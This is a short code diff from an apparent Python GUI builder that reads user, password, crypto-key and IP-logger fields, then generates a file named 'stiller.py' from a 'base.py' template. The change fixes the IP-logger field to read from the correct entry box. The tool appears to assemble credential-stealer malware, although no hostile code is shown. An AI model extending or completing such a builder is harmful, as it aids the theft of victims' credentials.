@@ -16,7 +16,7 @@ def button_clicked():
     user = str(entry2.get())
     password = str(entry3.get())
     cryptokey = str(entry4.get())
-    iplogger = str(entry4.get())
+    iplogger = str(entry5.get())
 
     base = open("base.py").read()
     stiller = open("stiller.py","w")
